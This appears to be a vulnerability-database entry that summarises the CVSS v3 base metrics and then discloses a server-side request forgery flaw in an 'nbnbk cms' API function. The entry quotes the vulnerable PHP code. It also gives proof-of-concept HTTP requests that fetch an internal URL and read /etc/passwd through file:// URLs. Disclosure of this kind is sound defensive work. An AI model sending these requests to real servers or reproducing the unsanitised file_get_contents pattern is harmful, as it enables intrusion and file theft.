# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

| A Server-Side Request Forgery (SSRF) in getFileBinary function of nbnbk cms allows remote attackers to force the application to make arbitrary requests via injection of arbitrary URLs into the url parameter.  Vulnerable code in `/application/api/controller/Index.php`  ```     /**      * 文件转Base64二进制流      * @param $url 网络文件路径，绝对地址      * @return string      */     public function getFileBinary()     {         $str = file_get_contents($_REQUEST['url']);         Util::echo_json(ReturnData::create(ReturnData::SUCCESS,chunk_split(base64_encode($str))));     } ```  Vulnerability PoC  ``` GET /api/Index/getFileBinary?url=http://172.16.119.1:8181/flag.txt HTTP/1.1 Host: 172.16.119.130 Connection: close  ```  The effect of the exploit is shown in the following figure. A remote attacker can force the application to make arbitrary requests via the injection of arbitrary URLs into the url parameter.  [image](https://user-images.githubusercontent.com/16551733/169286720-e97bcc47-5346-44e5-b1cf-a1d47e43aadf.png)  A remote attacker can also read arbitrary file information from the target system.  PoC  ``` GET /api/Index/getFileBinary?url=file:///etc/passwd HTTP/1.1 Host: 172.16.119.130 Connection: close  ```  [png1](https://user-images.githubusercontent.com/16551733/169288879-d553c8b7-02d9-4a32-98e9-129d839971ea.png)  After decoding the data field of the HTTP response body in base64, you can get the specific content of the file (`/etc/passwd`)  [image](https://user-images.githubusercontent.com/16551733/169289578-410c2f81-21c6-4147-bcf2-9176ed05c2a5.png) |
